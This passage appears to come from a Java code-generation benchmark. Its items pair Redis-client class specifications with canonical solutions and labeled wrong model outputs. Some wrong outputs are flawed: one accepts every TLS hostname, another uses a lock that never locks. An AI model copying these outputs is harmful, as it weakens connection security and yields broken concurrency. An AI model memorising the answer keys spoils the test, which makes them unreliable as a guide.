    "wrong_result": "```java\nimport com.dyuproject.protostuff.LinkedBuffer;\nimport com.dyuproject.protostuff.ProtostuffIOUtil;\nimport com.dyuproject.protostuff.RuntimeSchema;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private final RuntimeSchema<Seckill> schema;\n\n    public RedisDao(String ip, int port) {\n        this.jedisPool = new JedisPool(ip, port);\n        this.schema = RuntimeSchema.createFrom(Seckill.class);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            return getSeckill(seckillId, jedis);\n        }\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        String key = getSeckillRedisKey(seckillId);\n        byte[] bytes = jedis.get(key.getBytes());\n        if (bytes == null) {\n            return null;\n        }\n        Seckill seckill = schema.newMessage();\n        ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n        return seckill;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"lock:seckill:\" + seckillId;\n        ReentrantLock lock = new ReentrantLock();\n        try {\n            if (lock.tryLock()) {\n                Seckill seckill = getSeckill(seckillId);\n                if (seckill != null) {\n                    return seckill;\n                }\n                seckill = getDataFromDb.apply(seckillId);\n                if (seckill != null) {\n                    putSeckill(seckill);\n                }\n                return seckill;\n            } else {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n                return getOrPutSeckill(seckillId, getDataFromDb);\n            }\n        } finally {\n            lock.unlock();\n        }\n    }\n\n    public String putSeckill(Seckill seckill) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            return putSeckill(seckill, jedis);\n        }\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        String key = getSeckillRedisKey(seckill.getSeckillId());\n        byte[] data = ProtostuffIOUtil.toByteArray(seckill, schema, LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE));\n        return jedis.setex(key.getBytes(), 60 * 60, data);\n    }\n\n    private String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}\n```"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Create a Java class that implements a socket factory for establishing connections to Redis servers, supporting both regular and SSL/TLS connections with configurable timeouts and hostname verification.\n\nClass Description: DefaultJedisSocketFactory is a socket factory implementation for Redis client connections that handles both plain and SSL/TLS sockets, with support for connection timeouts, socket timeouts, host shuffling, and hostname verification.\n\nAttributes:\n- hostAndPort: HostAndPort - The Redis server address and port\n- connectionTimeout: int - Connection timeout in milliseconds\n- socketTimeout: int - Socket timeout in milliseconds\n- ssl: boolean - Flag indicating whether to use SSL/TLS\n- sslSocketFactory: SSLSocketFactory - Factory for creating SSL sockets\n- sslParameters: SSLParameters - SSL/TLS parameters\n- hostnameVerifier: HostnameVerifier - Hostname verifier for SSL/TLS\n- hostAndPortMapper: HostAndPortMapper - Mapper for host and port addresses\n\nMethods:\n- DefaultJedisSocketFactory() -> void - Default constructor using default host and port\n- DefaultJedisSocketFactory(HostAndPort hostAndPort) -> void - Constructor with specified host and port\n- DefaultJedisSocketFactory(JedisClientConfig config) -> void - Constructor with client configuration\n- DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) -> void - Constructor with both host/port and configuration\n- connectToFirstSuccessfulHost(HostAndPort hostAndPort) -> Socket - Internal method to establish connection to first available host\n- createSocket() -> Socket - Creates and returns a configured socket (plain or SSL) to Redis server\n- getSocketHostAndPort() -> HostAndPort - Returns the effective host and port after applying any mapping",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.util.IOUtils;\n\npublic class DefaultJedisSocketFactory implements JedisSocketFactory {\n\n  protected static final HostAndPort DEFAULT_HOST_AND_PORT = new HostAndPort(Protocol.DEFAULT_HOST,\n      Protocol.DEFAULT_PORT);\n\n  private volatile HostAndPort hostAndPort = DEFAULT_HOST_AND_PORT;\n  private int connectionTimeout = Protocol.DEFAULT_TIMEOUT;\n  private int socketTimeout = Protocol.DEFAULT_TIMEOUT;\n  private boolean ssl = false;\n  private SSLSocketFactory sslSocketFactory = null;\n  private SSLParameters sslParameters = null;\n  private HostnameVerifier hostnameVerifier = null;\n  private HostAndPortMapper hostAndPortMapper = null;\n\n  public DefaultJedisSocketFactory() {\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n    this(hostAndPort, null);\n  }\n\n  public DefaultJedisSocketFactory(JedisClientConfig config) {\n    this(null, config);\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n    if (hostAndPort != null) {\n      this.hostAndPort = hostAndPort;\n    }\n    if (config != null) {\n      this.connectionTimeout = config.getConnectionTimeoutMillis();\n      this.socketTimeout = config.getSocketTimeoutMillis();\n      this.ssl = config.isSsl();\n      this.sslSocketFactory = config.getSslSocketFactory();\n      this.sslParameters = config.getSslParameters();\n      this.hostnameVerifier = config.getHostnameVerifier();\n      this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n  }\n\n  private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws Exception {\n    List<InetAddress> hosts = Arrays.asList(InetAddress.getAllByName(hostAndPort.getHost()));\n    if (hosts.size() > 1) {\n      Collections.shuffle(hosts);\n    }\n\n    JedisConnectionException jce = new JedisConnectionException(\"Failed to connect to \" + hostAndPort + \".\");\n    for (InetAddress host : hosts) {\n      try {\n        Socket socket = new Socket();\n\n        socket.setReuseAddress(true);\n        socket.setKeepAlive(true);\n        socket.setTcpNoDelay(true);\n        socket.setSoLinger(true, 0);\n\n        socket.connect(new InetSocketAddress(host, hostAndPort.getPort()), connectionTimeout);\n        return socket;\n      } catch (Exception e) {\n        jce.addSuppressed(e);\n      }\n    }\n    throw jce;\n  }\n\n  @Override\n  public Socket createSocket() throws JedisConnectionException {\n    Socket socket = null;\n    try {\n      HostAndPort _hostAndPort = getSocketHostAndPort();\n      socket = connectToFirstSuccessfulHost(_hostAndPort);\n      socket.setSoTimeout(socketTimeout);\n\n      if (ssl) {\n        SSLSocketFactory _sslSocketFactory = this.sslSocketFactory;\n        if (null == _sslSocketFactory) {\n          _sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        }\n        Socket plainSocket = socket;\n        socket = _sslSocketFactory.createSocket(socket, _hostAndPort.getHost(), _hostAndPort.getPort(), true);\n\n        if (null != sslParameters) {\n          ((SSLSocket) socket).setSSLParameters(sslParameters);\n        }\n        socket = new SSLSocketWrapper((SSLSocket) socket, plainSocket);\n\n        if (null != hostnameVerifier\n            && !hostnameVerifier.verify(_hostAndPort.getHost(), ((SSLSocket) socket).getSession())) {\n          String message = String.format(\n            \"The connection to '%s' failed ssl/tls hostname verification.\", _hostAndPort.getHost());\n          throw new JedisConnectionException(message);\n        }\n      }\n\n      return socket;\n\n    } catch (Exception ex) {\n      IOUtils.closeQuietly(socket);\n      if (ex instanceof JedisConnectionException) {\n        throw (JedisConnectionException) ex;\n      } else {\n        throw new JedisConnectionException(\"Failed to create socket.\", ex);\n      }\n    }\n  }\n\n  protected HostAndPort getSocketHostAndPort() {\n    HostAndPortMapper mapper = hostAndPortMapper;\n    HostAndPort hap = this.hostAndPort;\n    if (mapper != null) {\n      HostAndPort mapped = mapper.getHostAndPort(hap);\n      if (mapped != null) {\n        return mapped;\n      }\n    }\n    return hap;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\n\npublic class DefaultJedisSocketFactory {\n    private HostAndPort hostAndPort;\n    private int connectionTimeout;\n    private int socketTimeout;\n    private boolean ssl;\n    private SSLSocketFactory sslSocketFactory;\n    private SSLParameters sslParameters;\n    private HostnameVerifier hostnameVerifier;\n    private HostAndPortMapper hostAndPortMapper;\n\n    public DefaultJedisSocketFactory() {\n        this.hostAndPort = new HostAndPort(\"localhost\", 6379);\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = new SSLParameters();\n        this.hostnameVerifier = (hostname, session) -> true;\n        this.hostAndPortMapper = new HostAndPortMapper();\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = 2000;\n        this.socketTimeout = 2000;\n        this.ssl = false;\n        this.sslSocketFactory = null;\n        this.sslParameters = new SSLParameters();\n        this.hostnameVerifier = (hostname, session) -> true;\n        this.hostAndPortMapper = new HostAndPortMapper();\n    }\n\n    public DefaultJedisSocketFactory(JedisClientConfig config) {\n        this.hostAndPort = new HostAndPort(config.getHost(), config.getPort());\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSsl();\n        this.sslSocketFactory = config.getSslSocketFactory();\n        this.sslParameters = config.getSslParameters();\n        this.hostnameVerifier = config.getHostnameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = config.getConnectionTimeout();\n        this.socketTimeout = config.getSocketTimeout();\n        this.ssl = config.isSsl();\n        this.sslSocketFactory = config.getSslSocketFactory();\n        this.sslParameters = config.getSslParameters();\n        this.hostnameVerifier = config.getHostnameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    protected Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws UnknownHostException {\n        HostAndPort mappedHostAndPort = hostAndPortMapper.map(hostAndPort);\n        Socket socket = createSocket(mappedHostAndPort);\n        return socket;\n    }\n\n    protected Socket createSocket() throws UnknownHostException {\n        HostAndPort mappedHostAndPort = hostAndPortMapper.map(hostAndPort);\n        return createSocket(mappedHostAndPort);\n    }\n\n    private Socket createSocket(HostAndPort hostAndPort) throws UnknownHostException {\n        Socket socket;\n        if (ssl) {\n            SSLSocket sslSocket = (SSLSocket) sslSocketFactory.createSocket();\n            sslSocket.setSSLParameters(sslParameters);\n            sslSocket.connect(new InetSocketAddress(hostAndPort.getHost(), hostAndPort.getPort()), connectionTimeout);\n            sslSocket.setSoTimeout(socketTimeout);\n            return sslSocket;\n        } else {\n            socket = new Socket();\n            socket.connect(new InetSocketAddress(hostAndPort.getHost(), hostAndPort.getPort()), connectionTimeout);\n            socket.setSoTimeout(socketTimeout);\n            return socket;\n        }\n    }\n\n    public HostAndPort getSocketHostAndPort() {\n        return hostAndPortMapper.map(hostAndPort);\n    }\n}\n```"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Java class that utilizes Java NIO's FileChannel to map a file into memory for read-only access, providing methods to access the mapped memory address and file size, and properly closing the channel when done.\n\nClass Description: The FileChannelProcessor class provides functionality to open a file using FileChannel, map it into memory in read-only mode, and expose the memory address and file size. It ensures proper resource cleanup by implementing a close method.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedAddress: long - The memory address where the file is mapped\nfileSize: long - The size of the mapped file in bytes\n\nMethods:\nFileChannelProcessor: [Constructor](String filePath) throws IOException - Initializes the FileChannel, maps the file into memory in read-only mode, and stores the memory address and file size\ngetMappedAddress: () -> long - Returns the memory address where the file is mapped\ngetFileSize: () -> long - Returns the size of the mapped file\nclose: () throws IOException - Closes the FileChannel to release system resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mappedAddress = fileChannel.map(MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.channels.FileChannel;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        fileChannel = new RandomAccessFile(filePath, \"r\").getChannel();\n        fileSize = fileChannel.size();\n        mappedAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n}\n```"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Implement a Java class for interacting with Redis using the Lettuce client, including connection management and data operations.\n\nClass Description: The RedisInteraction class provides functionality to establish and manage a connection to a Redis server, perform bulk data operations, and clean up resources. It uses the Lettuce client library for Redis interactions.\n\nAttributes:\n- client: RedisClient - The Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active connection to the Redis server\n\nMethods:\n- initializeConnection() -> void - Initializes the Redis client and establishes a connection to the Redis server. Also clears all existing data in Redis.\n- closeConnection() -> void - Closes the Redis connection and shuts down the client to release resources.\n- createRedisPublisher(long elements) -> Publisher<String> - Creates and returns a Publisher that streams Redis keys. Populates Redis with test data (number of elements specified by input parameter) before creating the publisher. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.ScanStream;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RedisInteraction {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public void closeConnection() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n        sync.flushall();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        Map<String, String> map = new HashMap<>();\n        for (int i = 0; i < elements; i++) {\n            String element = \"RedisInteraction-\" + i;\n            map.put(element, element);\n\n            if (i % 1000 - 2020 == 0 && !map.isEmpty()) {\n                sync.mset(map);\n                map.clear();\n            }\n        }\n\n        if (!map.isEmpty()) {\n            sync.mset(map);\n            map.clear();\n        }\n\n        return ScanStream.scan(connection.reactive());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport reactor.core.publisher.Flux;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisInteraction {\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(\"redis://localhost:6379\");\n        connection = client.connect();\n        RedisCommands<String, String> syncCommands = connection.sync();\n        syncCommands.flushAll();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public Flux<String> createRedisPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n        RedisCommands<String, String> syncCommands = connection.sync();\n        AtomicInteger counter = new AtomicInteger(0);\n        while (counter.get() < elements) {\n            syncCommands.set(\"key:\" + counter.get(), \"value:\" + counter.get());\n            counter.incrementAndGet();\n        }\n        return Flux.fromStream(syncCommands.keys(\"*\").stream().map(k -> k));\n    }\n}\n```"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = \"cluster:\" + config.getPriority() + \":\" + config.getHostAndPort();\n\n            if (poolConfig != null) {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig(), poolConfig)));\n            } else {\n                multiClusterMap.put(config.getPriority(),\n                        new Cluster(new ConnectionPool(config.getHostAndPort(),\n                                config.getJedisClientConfig())));\n            }\n        }\n    }\n\n    @Override\n    public Connection getConnection() {\n        return multiClusterMap.get(activeMultiClusterIndex).getConnection();\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        return multiClusterMap.get(multiClusterIndex).getConnection();\n    }\n\n    @Override\n    public void close() {\n        multiClusterMap.get(activeMultiClusterIndex).getConnectionPool().close();\n    }\n\n    public static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ConnectionPool connectionPool) {\n            this.connectionPool = connectionPool;\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getResource();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.logging.Logger;\n\npublic class MultiClusterPooledConnectionProvider {\n    private final Logger log;\n    private final Map<Integer, Cluster> multiClusterMap;\n    private volatile Integer activeMultiClusterIndex;\n    private final ReentrantLock activeClusterIndexLock;\n    private volatile boolean lastClusterCircuitBreakerForcedOpen;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) throws JedisValidationException {\n        if (multiClusterClientConfig == null) {\n            throw new JedisValidationException(\"Configuration cannot be null\");\n        }\n        this.log = Logger.getLogger(MultiClusterPooledConnectionProvider.class.getName());\n        this.multiClusterMap = new ConcurrentHashMap<>();\n        this.activeClusterIndexLock = new ReentrantLock();\n        // Initialize clusters based on configuration\n        for (int i = 0; i < multiClusterClientConfig.getClusterCount(); i++) {\n            Cluster cluster = new Cluster(multiClusterClientConfig.getClusterConfig(i));\n            multiClusterMap.put(i, cluster);\n        }\n        // Set initial active cluster index\n        activeMultiClusterIndex = 0;\n    }\n\n    public Connection getConnection() {\n        int currentIndex = activeMultiClusterIndex;\n        Cluster cluster = multiClusterMap.get(currentIndex);\n        if (cluster != null) {\n            return cluster.getConnection();\n        }\n        return null;\n    }\n\n    public Connection getConnection(int multiClusterIndex) {\n        Cluster cluster = multiClusterMap.get(multiClusterIndex);\n        if (cluster != null) {\n            return cluster.getConnection();\n        }\n        return null;\n    }\n\n    public void close() {\n        int currentIndex = activeMultiClusterIndex;\n        Cluster cluster = multiClusterMap.get(currentIndex);\n        if (cluster != null) {\n            cluster.getConnectionPool().close();\n        }\n    }\n\n    static class Cluster {\n        private final ConnectionPool connectionPool;\n\n        public Cluster(ClusterConfig clusterConfig) {\n            this.connectionPool = new ConnectionPool(clusterConfig);\n        }\n\n        public Connection getConnection() {\n            return connectionPool.getConnection();\n        }\n\n        public ConnectionPool getConnectionPool() {\n            return connectionPool;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 335,
    "Instruction": "Task Description: Create a Redis configuration class in Java that sets up Redis connection and template configurations using Spring Boot and Redisson.\n\nClass Description: The RedisConfig class is a Spring configuration class that provides Redis-related beans including RedisTemplate, RedissonClient, and a custom KeyGenerator. It configures connection settings, serialization, and client instances for Redis operations.\n\nAttributes:\n- REDIS_PREFIX: [String] - A constant string prefix for Redis connection URLs (\"redis://\")\n\nMethods:\n- redisTemplate: [redisTemplate](LettuceConnectionFactory lettuceConnectionFactory) -> RedisTemplate<Object, Object> - Creates and configures a RedisTemplate with FastJson serialization and String key serialization\n- redisson: [redisson](RedisProperties redisProperties) -> RedissonClient - Creates and configures a Redisson client instance with single server configuration\n- keyGenerator: [keyGenerator]() -> KeyGenerator - Creates a custom key generator that produces SHA-256 hashes of method invocation details\n\nThe class uses Spring annotations (@Configuration, @Bean, etc.) to manage bean creation and dependencies, and integrates with Spring Boot's RedisProperties for configuration.",
    "Canonical_solution": "import com.alibaba.fastjson.JSON;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.redisson.Redisson;\nimport org.redisson.api.RedissonClient;\nimport org.redisson.config.Config;\nimport org.redisson.config.SingleServerConfig;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnClass;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;\nimport org.springframework.boot.autoconfigure.data.redis.RedisProperties;\nimport org.springframework.boot.context.properties.EnableConfigurationProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.core.RedisOperations;\nimport org.springframework.data.redis.core.RedisTemplate;\nimport org.springframework.data.redis.serializer.StringRedisSerializer;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n@Configuration\n@ConditionalOnClass(RedisOperations.class)\n@EnableConfigurationProperties(RedisProperties.class)\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean(name = \"redisTemplate\")\n    @ConditionalOnMissingBean(name = \"redisTemplate\")\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        FastJsonRedisSerializer<Object> fastJsonRedisSerializer = new FastJsonRedisSerializer<>(Object.class);\n        template.setValueSerializer(fastJsonRedisSerializer);\n        template.setHashValueSerializer(fastJsonRedisSerializer);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setConnectionFactory(lettuceConnectionFactory);\n        return template;\n    }\n\n    @Bean(destroyMethod = \"shutdown\")\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        SingleServerConfig singleServerConfig = config.useSingleServer();\n        singleServerConfig.setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort());\n        if (redisProperties.getPassword() != null && !redisProperties.getPassword().isEmpty()) {\n            singleServerConfig.setPassword(redisProperties.getPassword());\n        }\n        singleServerConfig.setPingConnectionInterval(1000);\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (target, method, params) -> {\n            Map<String, Object> container = new HashMap<>(3);\n            Class<?> targetClassClass = target.getClass();\n            container.put(\"class\", targetClassClass.toGenericString());\n            container.put(\"methodName\", method.getName());\n            container.put(\"package\", targetClassClass.getPackage());\n            for (int i = 0; i < params.length; i++) {\n                container.put(String.valueOf(i), params[i]);\n            }\n            String jsonString = JSON.toJSONString(container);\n            return DigestUtils.sha256Hex(jsonString);\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "@Configuration\npublic class RedisConfig {\n\n    private static final String REDIS_PREFIX = \"redis://\";\n\n    @Bean\n    public RedisTemplate<Object, Object> redisTemplate(LettuceConnectionFactory lettuceConnectionFactory) {\n        RedisTemplate<Object, Object> template = new RedisTemplate<>();\n        template.setConnectionFactory(lettuceConnectionFactory);\n        template.setKeySerializer(new StringRedisSerializer());\n        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());\n        template.setHashKeySerializer(new StringRedisSerializer());\n        template.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());\n        return template;\n    }\n\n    @Bean\n    public RedissonClient redisson(RedisProperties redisProperties) {\n        Config config = new Config();\n        config.useSingleServer()\n              .setAddress(REDIS_PREFIX + redisProperties.getHost() + \":\" + redisProperties.getPort())\n              .setPassword(redisProperties.getPassword());\n        return Redisson.create(config);\n    }\n\n    @Bean\n    public KeyGenerator keyGenerator() {\n        return (target, method, params) -> {\n            StringBuilder sb = new StringBuilder();\n            sb.append(target.getClass().getName()).append(\":\");\n            sb.append(method.getName()).append(\":\");\n            for (Object param : params) {\n                sb.append(param != null ? param.toString() : \"null\").append(\",\");\n            }\n            if (sb.length() > 0) {\n                sb.setLength(sb.length() - 1);\n            }\n            try {\n                MessageDigest md = MessageDigest.getInstance(\"SHA-256\");\n                byte[] hashBytes = md.digest(sb.toString().getBytes(StandardCharsets.UTF_8));\n                StringBuilder hexString = new StringBuilder();\n                for (byte b : hashBytes) {\n                    String hex = Integer.toHexString(0xff & b);\n                    if (hex.length() == 1) hexString.append('0');\n                    hexString.append(hex);\n                }\n                return hexString.toString();\n            } catch (NoSuchAlgorithmException e) {\n                throw new RuntimeException(\"SHA-256 algorithm not found\", e);\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 338,
    "Instruction": "Task Description: Create a Java class that establishes and manages connections to a Redis master-replica setup using Lettuce client, with support for read operations from replicas and secure connection handling.\n\nClass Description: RedisMasterReplicaConnector is a utility class that provides methods to create, manage, and close connections to a Redis master-replica cluster. It supports read scaling by allowing read operations from replicas and includes secure connection handling with custom DNS resolution.\n\nAttributes:\n- clientResources: ClientResources - The Lettuce client resources configuration including custom socket address resolver\n\nMethods:\n- RedisMasterReplicaConnector(ClientResources) -> void - Constructor that initializes client resources with custom DNS resolution\n- createConnection(String host, String masterId) -> StatefulRedisMasterReplicaConnection<String, String> - Creates a connection to Redis master-replica setup with specified host and master ID\n- closeConnection(StatefulRedisMasterReplicaConnection<String, String> connection) -> void - Properly closes the Redis connection and shuts down the client\n- performOperations(StatefulRedisMasterReplicaConnection<String, String> connection, String key, String value) -> void - Demonstrates basic Redis operations (set and get) using the established connection",
